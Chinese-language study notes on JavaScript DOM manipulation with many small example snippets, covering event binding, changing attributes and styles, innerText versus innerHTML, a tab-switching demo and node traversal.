属性对这个标签内容重新赋值定义
```
[DOM-案例一](DOM-案例.md)
[DOM-案例二](DOM-案例二.md)

[TOC]
>[success] # DOM 案例
```
1.如果直接给标签中的 宽高定义不用加px，如果给style加定义需要px
2.成对的标签,中间的文本内容,设置的时候,都使用innerText这个属性的方式
3.this 代表当前对象 活用等同于python 中的self
4.点谁谁怀孕案例中，每次点击需要给所有的按钮重新赋值，所以内部要再次循环
5.模拟点击图片大小，这个时间绑定在img标签上，只不过让a 标签暂时保存大图的地
 址，当点击a标签的时候，进行地址交换变更。一定要使用return flase 交互地址
6.getElementsByTagName，是伪数组获取一组标签
7.当有不同类型的input 标签，他们的type 就是对比的突破点 见一组input ，这对text 
  类型添加文本案例 
8.当我们对 一个函数封装的时候一定要return 返回函数
9.在表单标签中,如果属性和值只有一个,并且值是这个属性本身,,DOM操作的时候
 这个属性值,是布尔类型就可以了
10.凡是css中这个属性是多个单词的写法,在js代码中DOM操作的时候.把-干掉,后面的单
 词的首字母大写即可,例如background-color backgroundColor
11.当通过按钮来显示和隐藏的控制，通过改变value 来作为入口点
12.在js代码中DOM操作的时候,设置元素的类样式,不用class关键字,应该使
 用,className
13.最后一个案例完美 多看学习思想
```

>[success] # id绑定事件

>[danger] ##### 点击按钮，弹出图片
```
1.先点击button 按钮，触发事件
2.获取img 便签的整个元素
3.给img元素内部属性从新复制
```
```
<input type="button" value="显示图片" id="btn">
<img src="" alt="" id="im">
<script>
    var btnObj=document.getElementById("btn");
    btnObj.onclick = function () {
        var imbObj = document.getElementById("im");
        imbObj.src ="images/liuyan.jpg";
        imbObj.width = "300";
        imbObj.height = "400";
    }
</script>
```
>[danger] ##### 跟P标签的内容重新赋值
```
1.成对的标签,中间的文本内容,设置的时候,都使用innerText这个属性的方式
```
```
<input type="button" value="点击" id="btn">
<p id="p1">我是谁</p>
<script>
    var btnObj=document.getElementById("btn");
    btnObj.onclick = function () {
        var imbObj = document.getElementById("p1");
        imbObj.innerText = "你是我"
    }
</script>
```
>[danger] ##### 点击按钮，更改a标签内容
```
<input type="button" value="点击" id="btn">
<a id="a" href="https://www.baidu.com">百度</a>
<script>
   var objbtn = document.getElementById("btn");
   objbtn.onclick = function () {
       var aobj = document.getElementById("a");
       aobj.href = "https://www.jiumodiary.com/";
       aobj.innerText = "搜书"
   }
</script>
```

>[danger] ##### 点击按钮，更改按钮属性 this
```
1.this  代指当前对象
```
```
<input type="button" value="按钮" id="btn">

<script>
    var btnObj = document.getElementById("btn");
    btnObj.onclick = function () {
        this.value = "改变按钮";
        this.id = "btn2"
    }
</script>
``` 

>[danger] ##### 更改图片信息
```

<img src="images/liuyan.jpg" alt="" id="im"/>
<script>
    var idobg = document.getElementById("im");
    idobg.onclick =function () {
        this.width = "200";
    }
</script>
```
>[danger] ##### 点谁谁怀孕 难度4
```
1.一般的错误想法是触发事件后进行重新赋值，没有考虑到因为是一组数据，所以触发
 要改变的也是一组数据，因此做循环对这一组数据重新赋值
```
```
<input type="button" value="没怀孕"/>
<input type="button" value="没怀孕"/>
<input type="button" value="没怀孕"/>
<input type="button" value="没怀孕"/>
<script>
    var idobg = document.getElementsByTagName("input");
    for (var i=0;i<idobg.length;i++){
        idobg[i].onclick = function () {
            for(var j=0;j<idobg.length;j++){
                idobg[j].value = "没怀孕"
            }
            this.value = "怀孕"
        }


    }
</script>
``` 
>[danger] ##### 模拟点击小图片显示大图片 难度4
```
1.a标签保存这大图片的地址
2.当我们点击图片才触发，因此onclick 事件应该绑在图片上
3.将a 标签大图片的连接赋值给小图片，所一展示出大图片的
4.return flase 结束
```
```
<a href="images/1.jpg" id="ak"><img src="images/1-small.jpg" id="im"></a>
<script>
    var aobg = document.getElementById("im");
    aobg.onclick = function () {
        this.src = document.getElementById("ak").href;
        return false
    }

</script>
```
* 升级
```
<a href="images/1.jpg" id="ak"><img src="images/1-small.jpg" id="im"></a>
<script>
    var imobg = document.getElementById("im");
    var aobj = document.getElementById("ak").href;
    imobg.onclick = function () {
        var temp = this.src
        this.src = aobj
        aobj =temp
        return false
    }

</script>
```
>[success] # 标签绑定事件
```
1.获取便签对应方法getElementsByTagName，得到的是数组
```
>[danger] ##### 点击按钮更改一组P标签内容
```

<input type="button" value="点击" id="btn">
<div id="dv1">
    <p>你好</p>
    <p>你好</p>
    <p>你好</p>
    <p>你好</p>
    <p>你好</p>
</div>

<div id="dv2">
    <p>嘎嘎</p>
    <p>嘎嘎</p>
    <p>嘎嘎</p>
    <p>嘎嘎</p>
</div>
<script>
   var objbtn = document.getElementById("btn");
   objbtn.onclick = function () {
       var pobj = document.getElementsByTagName("p");
       for (var i =0;i<pobj.length;i++){
           pobj[i].innerText = "我是P标签"
       }
   }
</script>
```

>[danger] ##### 点击按钮更改图片内容
```
<input type="button" value="点击" id="btn">
<img src="images/cangjingkong.jpg" alt="测试" title="测试1">
<script>
   var objbtn = document.getElementById("btn");
   objbtn.onclick = function () {
       var pobj = document.getElementsByTagName("img");
       pobj[0].alt = "更改";
       pobj[0].title ="更改1"
   }
</script>
```
>[danger] ##### 一组input ，这对text 类型添加文本
```
1. 对input 类型做判断
```
```

<input type="button" value="修改文本框的值" id="btn"/><br/>
<input type="text" value=""/><br/>
<input type="text" value=""/><br/>

<script>
    var objbtn = document.getElementById("btn");
    objbtn.onclick = function () {
       var pobj = document.getElementsByTagName("input");
       for(var i =0;i<pobj.length;i++){
           if (pobj[i].type !="button"){
               pobj[i].value = "你好"
           }
       }
   }
</script>
```

>[danger] ##### 点击每一个图片，弹出对话框
```
<img src="images/1.jpg" alt="" id="im1" />
<img src="images/2.jpg" alt="" id="im2" />
<img src="images/3.jpg" alt="" id="im3" />

<script>
    var objimg = document.getElementsByTagName("img");
    for (var i=0;i<objimg.length;i++){
        objimg[i].onclick = function () {
            alert("绑定事件")
        }
    }
</script>
```

>[success] # 对函数封装
```
1. 一定对封装的函数返回
function my$(id) {
    return document.getElementById(id);
  }
```

>[danger] ##### 点击按钮显示大图片
```
<input type="button" value="显示大图" id="btn"/>
<img src="images/1-small.jpg" alt="" id="im">
<script>
  function $my(id) {
      return document.getElementById(id)
  }
  $my("btn").onclick = function () {
      $my("im").src = "images/1.jpg"
  }


</script>
```

>[success] # 对一些特殊属性例如checkbox
```
1.规律:在表单标签中,如果属性和值只有一个,并且值是这个属性本身,,DOM操作的时候
 这个属性值,是布尔类型就可以了
2.例如之前写 checked = “checked”因为字符串本身是true，所以变相用了bool类型
```

>[danger] ##### 点击按钮选择兴趣--checked

```
<input type="button" value="选择兴趣" id="btn"/>
<input type="checkbox" value="1" name="xingqu" />吃饭
<input type="checkbox" value="2" name="xingqu" />睡觉
<input type="checkbox" value="3" name="xingqu" id="ck1" />打豆豆
<input type="checkbox" value="4" name="xingqu" />打篮球
<input type="checkbox" value="5" name="xingqu" />打足球
<input type="checkbox" value="6" name="xingqu" id="ck2" />打铅球
<script>
  function $my(id) {
      return document.getElementById(id)
  }
  $my("btn").onclick = function () {
      $my("ck1").checked = true;
      $my("ck2").checked = true;
  }


</script>
```
>[danger] ##### 选择--selected
```
1.下拉框用selected
```
```
<input type="button" value="城市" id="btn"/>
<select name="" id="ss">
    <option value="1">大连</option>
    <option value="2">上海</option>
    <option value="3">北京</option>
    <option value="4" id="op1">天津</option>
</select>
<script>
  function $my(id) {
      return document.getElementById(id)
  }
  $my("btn").onclick = function () {
      $my("op1").selected = true;
  }

``` 

>[danger] ##### 用value赋值的-- textarea
```
1.textarea是两个标签包裹，所以既可以用innerText，推荐使用value
```
```
<textarea name="" id="tt" cols="30" rows="10" readonly="readonly" >
  注册用户的协议:
    1.吃饭睡觉打豆豆

</textarea>
<input type="button" value="注册" id="btn"/>
<script>
  function $my(id) {
      return document.getElementById(id)
  }
  $my("btn").onclick = function () {
      $my("tt").value = "统一";
  }

```
>[success] # 控制style
```
1.凡是css中这个属性是多个单词的写法,在js代码中DOM操作的时候.把-干掉,后面的单
 词的首字母大写即可,例如background-color backgroundColor
``` 

>[danger] ##### 控制div样式
```
<input type="button" value="设置样式" id="btn"/>
<div id="dv"></div>
<script>
  function $my(id) {
      return document.getElementById(id)
  }
  $my("btn").onclick = function () {
      $my("dv").style.width = "300px";
      $my("dv").style.height = "200px";
      $my("dv").style.backgroundColor = "pink";

  }
</script>
```
>[danger] ##### 点击按钮隐藏div
```
1.一定要return 一个对象回去
```
```
    <style>
        div{
            width: 300px;
            height: 200px;
            background-color: darkmagenta;
        }
    </style>
</head>
<body>
<input type="button" value="隐藏" id="btn"/>
<input type="button" value="显示" id="btn2"/>
<div id="dv">

</div>
<script>
    function $my(id) {
        return document.getElementById(id);
    }
    $my("btn").onclick=function () {
        $my("dv").style.display="none";
    };
    $my("btn2").onclick = function () {
        $my('dv').style.display = "block"
    }
</script>
```

>[danger] ##### 一个按钮点击隐藏/再点击显示
```
1.找到控制条件的变量，value ，来改变div显示
```
```
<input type="button" value="隐藏" id="btn"/>
<div id="dv">

</div>
<script>
    function $my(id) {
        return document.getElementById(id);
    }
    $my("btn").onclick=function () {
        if(this.value=="隐藏"){
            $my("dv").style.display="none";
            this.value = "显示"

        }else if(this.value=="显示"){
            $my("dv").style.display="block";
            this.value ="隐藏"
        }

    };
```

>[danger] ##### className 应用
```
1.在js代码中DOM操作的时候,设置元素的类样式,不用class关键字,应该使
 用,className
```
```
  <style>
    .cls {
      width: 300px;
      height: 200px;
      background-color: yellow;
      border: 2px solid red;
    }
  </style>
</head>
<body>
<input type="button" value="设置样式" id="btn"/>
<div id="dv"></div>
<script src="common.js"></script>
<script>
  //设置div的样式
  my$("btn").onclick = function () {
    var dvObj = my$("dv");
    dvObj.style.width = "300px";
    dvObj.style.height = "300px";
    dvObj.style.backgroundColor = "yellow";
    dvObj.style.border = "10px solid red";

    //在js代码中DOM操作的时候,设置元素的类样式,不用class关键字,应该使用,className
    //my$("dv").className="cls";


  };
```

>[danger] ##### 通过className 控制显示隐藏
```
    <style>
        div {
            width: 300px;
            height: 200px;
            background-color: yellow;
            border: 2px solid red;
        }

        .cls {
            display: none;
        }
    </style>
</head>
<body>
<input type="button" value="隐藏" id="btn"/>
<div id="dv">

</div>
<script>
    function $my(id){
        return document.getElementById(id)
    }
    $my("btn").onclick = function () {
        if($my("dv").className != "cls"){
            $my("dv").className = "cls";
            this.value = "显示";
        }else{
            $my("dv").className = "";
            this.value = "隐藏";
        }
    }

</script>
```

>[danger] ##### 模拟网站开灯关灯--三则运算完美体验
```
    <style>
        .cls {
            background-color: black;
        }
    </style>
</head>
<body>
<input type="button" value="开/关灯" id="btn"/>

<script>
    function $my(id){
        return document.getElementById(id)
    }
    $my("btn").onclick = function () {
        document.body.className =  document.body.className !="cls"? "cls":""
    }

</script>
```
[TOC]
>[success] # DOM 案例二
```
1.阻止链接跳转 在触发事件中加return flase
2.鼠标移入事件onmouseover
3.鼠标移出的事件onmouseout
4.获取名字属性--getElementsByName
5.获取classname -- getElementsByClassName
6.使用querySelector，通过 # . 等可以识别id class ，返回单个元素
7.querySelectorAll，获取一组数据
8.获取焦点/失去焦点 onfocus/onblur
9.想要设置标签内容,使用innerHTML,想要设置文本内容,innerText或者textContent,或者innerHTML,推荐用innerHTML
10.获取自定的属性值-getAttribute
11.赋值自定义属性setAttribute
12.删除属性--removeAttribute

```

>[danger] ##### 点击按钮，input 输入置灰
```
<input type="button" value="点击禁用" id="btn">
<input type="text" value="文本内容" id="txt">
</body>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$('btn').onclick = function () {
        my$('txt').disabled = true; // disabled 禁用input
    }
</script>    
```
>[danger] ##### 点击按钮背景色变黄
```
<input type="button" value="点击变色" id="btn">
<ul id="uu">
    <li>北京</li>
    <li>上海</li>
    <li>天津</li>
    <li>大连</li>
</ul>
</body>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$('btn').onclick = function () {
        my$('uu').style.backgroundColor = "yellow";
    }
</script>
```
>[danger] ##### 抑制链接跳转
```
1.虽然下面是三个案例，共同点就是 事件最后返回false 
2.当事件返回false ，链接就不会在地址栏里面重新跳转
```

* 第一种
```
<a href="http://www.baidu.com" onclick="alert('1'); return false">百度</a>
```

* 第二种
```
<a href="http://www.baidu.com" onclick="return f1()">百度</a>
<script>
	function f1(){
        alert('1');
        return false
    }
</script>
```

* 第三种
```
<a href="http://www.baidu.com" id="btna">百度</a>
<script>
	function my$(id){
        return document.getElementById(id);
    }
    my$("btna").onclick = function () {
        alert("1");
        return false;
    }
</script>
```

>[danger] ##### 点击图片，大小图片都展示
```
1.跟 案例一中的思路基本一致，也可以通过触发a 标签触发事件
```
```
<a href="images/1.jpg" id="ak"><img src="images/1-small.jpg" alt=""></a>
<img src="" alt="" id="big">
<script src="common.js"></script>
<script>

  //点击小图,下面显示大图
  //点击超链接
  my$("ak").onclick=function () {
    my$("big").src=this.href;
    return false;
  };

</script>
```

>[danger] ##### 一组图片，显示切换
![](https://box.kancloud.cn/f092d12a49236981db9b12acdaf1534a_590x464.png)
```
1. css 基础 设置ul内边距，ul浮动去掉样式
2. css 基础<div style="clear:both"></div> 做一个上下界限
3. 要为每一个图片绑定一个onclick 事件
4. 利用return flase 阻止链接跳转
```
```
<style>
    ul{
        padding: 0px;
    }
    ul li{
        list-style: none;
        float: left;
        margin-right: 10px;
    }
</style>
<body>
<h2>
    美女画廊
</h2>

<ul id="imagegallery">
    <li><a href="images/1.jpg" title="美女A">
        <img src="images/1-small.jpg" width="100" alt="美女1"/>
    </a></li>
    <li><a href="images/2.jpg" title="美女B">
        <img src="images/2-small.jpg" width="100" alt="美女2"/>
    </a></li>
    <li><a href="images/3.jpg" title="美女C">
        <img src="images/3-small.jpg" width="100" alt="美女3"/>
    </a></li>
    <li><a href="images/4.jpg" title="美女D">
        <img src="images/4-small.jpg" width="100" alt="美女4"/>
    </a></li>
</ul>


<div style="clear:both"></div>
<!--显示大图的-->
<img id="image" src="images/placeholder.png" alt="" width="450"/>
<p id="des">选择一个图片</p>
</body>
<script>
    var ul = document.getElementById("imagegallery")
    var lia = ul.getElementsByTagName("a")
    for(var i=0;i<lia.length;i++){
        lia[i].onclick = function () {
            document.getElementById("image").src = this.href;
            document.getElementById("des").innerText = this.title;
            return false
        }
    }
</script>
```

>[danger] ##### 三目运算的完美体现--奇红偶黄
```
<input type="button" value="隔行变色" id="btn"/>
<ul id="uu">
    <li>红旗</li>
    <li>五菱宏光</li>
    <li>奔驰</li>
    <li>兰博基尼</li>
    <li>哈弗</li>
    <li>奥拓</li>
    <li>奥迪</li>
    <li>悍马</li>
</ul>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn").onclick = function () {
       var li = my$("uu").getElementsByTagName("li");
       for (var i =0;i<li.length;i++){
           li[i].style.backgroundColor = i%2?"yellow":"red";
       }
    }
</script>
```

>[danger] ##### 鼠标移入/移出--onmouseover/onmouseout
```
1.鼠标移入事件onmouseover
2.鼠标移出的事件onmouseout
```
```
<ul id="uu">
    <li>红旗</li>
    <li>五菱宏光</li>
    <li>奔驰</li>
    <li>兰博基尼</li>
    <li>哈弗</li>
    <li>奥拓</li>
    <li>奥迪</li>
    <li>悍马</li>
</ul>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    var li = my$("uu").getElementsByTagName("li");
    for(var i =0;i<li.length;i++){
        li[i].onmouseover = function () {
            this.style.backgroundColor = "yellow"
        }
    }
    for(var i =0;i<li.length;i++){
        li[i].onmouseout = function () {
            this.style.backgroundColor = ""
        }
    }
</script>
```
>[danger] ##### 小二维码，鼠标移入变大
```
    <style>
        .nodeSmall {
            width: 50px;
            height: 50px;
            background: url(images/bgs.png) no-repeat -159px -51px;
            position: fixed;
            right: 10px;
            top: 40%;
        }
        .erweima {
            position: absolute;
            top: 0;
            left: -150px;
        }
        .nodeSmall a {
            display: block;
            width: 50px;
            height: 50px;
        }
        .hide {
            display: none;
        }

        .show {
            display: block;
        }
    </style>


</head>
<body>
<div class="nodeSmall" id="node_small">
    <a href="#"></a><!--锚定-->
    <div class="erweima hide" id="er">
        <img src="images/456.png" alt=""/>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    var obj = my$("node_small").getElementsByTagName("a")[0]
    obj.onmouseover =function () {
        my$("er").className = "erweima show"
    }

    obj.onmouseout =function () {
        my$("er").className = "erweima hide"
    }
</script>
```

>[danger] ##### 获取名字属性--getElementsByName
```
<input type="button" value="显示效果" id="btn"/><br/>
<input type="text" value="您好" name="name1"/><br/>
<input type="text" value="您好" name="name2"/><br/>
<input type="text" value="您好" name="name1"/><br/>
<input type="text" value="您好" name="name3"/><br/>
<input type="text" value="您好" name="name1"/><br/>
<input type="text" value="您好" name="name1"/><br/>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn").onclick = function () {
        //通过name属性值获取元素-------表单的标签
        var inputs = document.getElementsByName("name1")
        for (var i =0;i<inputs.length;i++){
            inputs[i].value = "我很好"
        }
    }

</script>
```

>[danger] ##### 获取classname -- getElementsByClassName
```
    <style>
        div {
            width: 200px;
            height: 50px;
            background-color: green;
            margin-top: 10px;
        }

        .cls {
            background-color: yellow;
        }
    </style>
</head>
<body>
<p>这是一个p</p>
<p class="cls">这是另一个p</p>
<span class="cls">这是第一个span</span><br/>
<span>这是第二个span</span><br/>
<div class="cls">这是第一个div</div>
<div>这是第二个div</div>
<input type="button" value="显示效果" id="btn"/><br/>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn").onclick = function () {
        var cls = document.getElementsByClassName("cls")
        for (var i =0;i<cls.length;i++){
            cls[i].style.backgroundColor = "red"
        }
    }

</script>
```

>[danger] ##### 万能的querySelector
```
1.使用querySelector，通过 # . 等可以识别id class ，返回单个元素
```
```
<input type="button" value="万能的querySelector" id="btn">
<script>
function my$(el) {
    return document.querySelector(el)
}

my$("#btn").onclick = function () {
    alert(1)
}
</script>
```

>[danger] ##### 万能的querySelectorAll
```
1.querySelectorAll，获取一组数据
```
```
<input type="button" value="万能的querySelector" class="btn">
<input type="button" value="万能的querySelector" class="btn">
<script>
function my$(el) {
    return document.querySelectorAll(el)
}

    var btn=my$(".btn")
    for (var i =0;i<btn.length;i++){
        btn[i].onclick = function () {
            this.style.backgroundColor="yellow"
        }
}
</script>
```
>[danger] ##### 鼠标移入div边框变色
![](https://box.kancloud.cn/0d470742ca519ea0fb27537ea3afa40e_1178x202.png)
```
1.要设置一个默认的边框
2.当鼠标移入的时候将默认变宽的颜色更改
3.移除后不赋值，自动恢复原来的参数
```
```
    <style>
        div{
            width: 200px;
            height: 150px;
            background-color:green ;
            float: left;
            margin-right: 10px;
            border: 2px solid green;
        }
    </style>
</head>
<body>
<div></div>
<div></div>
<div></div>
<div></div>
<div></div>
<script>
    var di = document.getElementsByTagName("div")
    for (var i=0;i<di.length;i++){
        di[i].onmouseover =function () {
            this.style.border="2px solid red";
        };
        di[i].onmouseout =function () {
            this.style.border = ""
        };
    }
</script>
```
>[danger] ##### 获取焦点/失去焦点 onfocus/onblur
```
1.当获取焦点时候判断，当前value 是不是默认值，如果是就清空，并且给字颜色重新
 赋值
 2.当得到焦点判断长度，如果长度是0，重新将提示字显示在上面
```
```
<input type="text" value="请输入搜索内容" id="btn"/>

</body>
<script>
    function my$(id){
        return document.getElementById(id)
    }

    my$("btn").onfocus = function () {
        if (this.value == "请输入搜索内容"){
            this.value = " ";
            this.style.color = "black";
        }
    }


    my$("btn").onblur = function () {
        if(this.value == 0){
            this.value =  "请输入搜索内容";
            this.style.color="";
        }
    }
</script>
```

>[danger] ##### 标签复制区别 innerText/innerHTML
```
1.总结:想要设置标签内容,使用innerHTML,想要设置文本内容,innerText或者
 textContent,或者innerHTML,推荐用innerHTML

```

* 赋值时候
```
1.两个都会将，标签内的所有内容替换
2.innerText 只能设置文本内容，及时文本内容有标签，也会将标签变成文字输出
3.innerHTML 既可以设置文本内容，也可将便签变成标签展示
```
```
function my$(id) {
       return document.getElementById(id);
   }

   my$("btn").onclick = function () {
       //my$('dv').innerText = "哈哈";
        // my$('dv').innerText = "<p>p标签</p>";
       //
       // my$("dv").innerHTML="哈哈";
       // my$("dv").innerHTML="<p>这是一个p</p>";
   }
```
* 获取值时候
```
1. innerText可以获取标签中间的文本内容,但是标签中如果还有标签,那么最里面的标签
 的文本内容也能获取.---获取不到标签的,文本可以获取
2. innerHTML才是真正的获取标签中间的所有内容
```
```
my$("btn2").onclick=function () {
       //可以获取标签中的文本内容
       console.log(my$("dv").innerText);
       //console.log(my$("dv").innerHTML);
   };
```
>[danger] ##### 获取自定的属性值-getAttribute
```
1.定义元素中，不存在的属性使用getAttribute("自定义属性的名字")才能获取这个属性
 的值
```
```
<ul id="uu">
    <li score="10">成绩1</li>
    <li score="20">成绩2</li>
    <li score="30">成绩3</li>
    <li score="40">成绩4</li>
</ul>
<script>
    var list=document.getElementsByTagName("li");
    for(var i=0;i<list.length;i++){
        list[i].onclick=function () {
            //alert(this.score);//不能
            //可以
            alert(this.getAttribute("score"));
        };
    }
</script>
```

>[danger] ##### 赋值自定义属性setAttribute
```
1.setAttribute("a",b)，两个参数第一个参数是，设置的属性名称，第二个是赋值
```
```
<ul id="uu">
    <li>成绩1</li>
    <li>成绩2</li>
    <li>成绩3</li>
    <li>成绩4</li>
</ul>
<script>
    var list=document.getElementsByTagName("li");
    for(var i=0;i<list.length;i++){
        list[i].setAttribute("score",(i+1)*10)
    }

</script>
```
>[danger] ##### 删除属性--removeAttribute
```
<input class="a" type="button" id="btn">
<script>
    var inputs=document.getElementById("btn");
    inputs.onclick = function () {
        this.removeAttribute("class")
    }

</script>
```

>[success] # 经典案例 tab页切换
![](https://box.kancloud.cn/95b892344c990433068463df29204e53_405x301.png)
```
1.class 样式中box 画出一个大的框架

2.在大的框架中分 出两个div ，其中hd 负责的是tab 标题部分，用span 设置成内联标签，在设置一个current 负责显示被选
中的tab标签的颜色

3.下面的bd，内容部分用了ul-li结构嵌套，实际上每个li中都已经将内容加载，设置属性将他们全部隐藏，设置current属性，
li谁有 这个属性谁显示

4.js 部分，给每一个 tab 标签绑定事件，然后再给每一个tab，添加一个新的属性index 用来记录标题是第几个，点击后循环
把每一个li class 负责显示当前的current全部删除，给当前被点击的这个 重新赋值current

5.js 内容部分 循环清空 所有的current 属性，给当前获取的标题位置的 内容加上class current
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        ul {
            list-style-type: none;
        }
        .box{
            width:400px;
            height: 300px;
            border: 1px solid #ccc;
            margin: 100px auto;
            overflow: hidden;
        }
        .hd{
            height: 45px;
        }
        .hd span {
            display: inline-block;
            width: 90px;
            background-color: pink;
            line-height: 45px;
            text-align: center;
            cursor: pointer;
        }
        .hd span.current{
            background-color: purple;
        }
        .bd li {
            height: 255px;
            background-color: purple;
            display: none;
        }
        .bd li.current {
            display: block;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="hd" id="hd">
            <span class="current">1</span>
            <span>1</span>
            <span>1</span>
            <span>1</span>
        </div>
        <div class="bd" id="bd">
            <ul>
                <li class="current">1</li>
                <li>2</li>
                <li>3</li>
                <li>4</li>
            </ul>
        </div>
    </div>

<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var spans = my$('hd').getElementsByTagName('span');
    var lists = my$('bd').getElementsByTagName('li');
    for(var i=0;i<spans.length;i++){
        spans[i].setAttribute('index',i);
        spans[i].onclick = function () {
            for(var j=0;j<spans.length;j++){
                spans[j].removeAttribute('class');
            }// end for
            this.setAttribute("class","current");
            var num = this.getAttribute("index");
            for(var k =0;k<lists.length;k++){
                lists[k].removeAttribute('class');
            }
            lists[num].className = "current"

        }// end onclick
    } // end for


</script>
```
>[success] # 节点操作
```
1.节点：页面中所有的内容都是节点:标签,属性,文本
2.节点属性：
  nodeTye 节点类型：返回 1 -标签/2-属性 /3-文本
  nodeName 节点名字：标签节点 - 大写的标签名字/属性节点- 小写的属性名
  字/文本节点 - text类型
  nodeValue：节点的值：标签节点 - null/属性节点-小写的属性名字/文本节
  点-#text
```
[TOC]
>[success] # 节点案例
```
1.children            --- 获取元素的子类
2.childNodes          --- 获取子类节点
3.firstChild          --- 第一个子节点(谷歌火狐) 第一个子元素(IE8)
4.firstElementChild   --- 第一个子元素（谷歌火狐） （IE8）不支持
5.lastChild           --- 最后一个子节点(谷歌火狐) 第一个子元素(IE8)
6.lastElementChild    --- 最后一个子元素（谷歌火狐） （IE8）不支持
7.parentNode          --- 获取父类节点
8.parentElement  	  --- 获取父类元素
9.getAttributeNode()  --- 获取属性节点
10.previousSibling    --- 前一个兄弟节点
11.previousElementSibling --- 前一个兄弟元素
12.nextSibling        --- 后一个兄弟节点
13.nextElementSibling --- 后一个兄弟元素
```
>[danger] ##### 节点案例
```
<body>
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var uloObj = my$('uu');
    console.log(uloObj.parentNode); // div
    console.log(uloObj.parentElement); // div
    console.log(uloObj.parentNode.nodeType) // 1
    console.log(uloObj.parentNode.nodeName) // DIV
    console.log(uloObj.parentNode.nodeValue) // null

    console.log(ulObj.parentNode);//div
    console.log(ulObj.parentNode.parentNode);//body
    console.log(ulObj.parentNode.parentNode.parentNode);//html
    console.log(ulObj.parentNode.parentNode.parentNode.parentNode);//document
    console.log(ulObj.parentNode.parentNode.parentNode.parentNode.parentNode);//null

</script>
```

>[danger] ##### 认识节点案例
![](https://box.kancloud.cn/8f754745ab211d14a6a80ed01288f9ce_808x251.png)
```
1.根据上面的图可以分析可以更容易理解节点，空白的信息也属于文本内容
2.整个li 是跟ul 在一起的
3. nodeType--->节点的类型:1---标签,2---属性,3---文本
   nodeName--->节点的名字:大写的标签--标签,小写的属性名---属性,#text---文本
   nodeValue-->节点的值:标签---null,属性--属性的值,文本--文本内容
```
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("dv")
    for(var i=0;i<dvObj.childNodes.length;i++){
        var node=dvObj.childNodes[i];
        console.log(node.nodeType+"====="+node.nodeName+"===="+node.nodeValue);
    }

</script>
```
>[danger] ##### 获取属性节点  --- getAttributeNode
```
1.获取属性 除了使用getAttribute 也可以使用getAttributeNode
2.但注意只能获取一个标签的属性
```
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("dv")
    var node = dvObj.getAttributeNode('id')
    console.log(node.nodeType+"----"+node.nodeName+"===="+node.nodeValue);
    var getId = dvObj.getAttribute('id')
    console.log(getId)

</script>

打印结果：
2----id====dv
dv
```
>[danger] ##### 获取元素/节点子类 -- children/childNodes
```
1.childNodes 还会获取文本内容
2.children 只会获取标签内容
```
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("dv")
    var node = dvObj.childNodes
    var el = dvObj.children
    console.log(node, el)

</script>
打印结果：
NodeList(7) [text, span, text, p, text, ul#uu, text]
HTMLCollection(3) [span, p, ul#uu, uu: ul#uu]
```
>[danger] ##### 父级节点/父级元素 --- parentNode/parentElement
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("uu")
    var node = dvObj.parentNode
    var el = dvObj.parentElement
    console.log(node)
    console.log(el)

</script>

打印结果：
<div id="div">...</div>
```
>[danger] ##### 子元素/子节点 --- children/childNodes
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("uu")
    var node = dvObj.childNodes
    var el = dvObj.children
    console.log(node)
    console.log(el)

</script>

打印结果：
NodeList(7) [text, span, text, p, text, ul#uu, text]
HTMLCollection(3) [span, p, ul#uu, uu: ul#uu]
```
>[danger] ##### 前一个兄弟节点/元素  --- previousSibling/previousElementSibling
```
1.注意节点是包含文本信息
2.元素直接是标签
```
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("uu")
    var node = dvObj.previousSibling
    var el = dvObj.previousElementSibling
    console.log(node)
    console.log(el)

</script>

打印结果：
#text
<p>这是div中的第二个元素,第一个p标签</p>
```
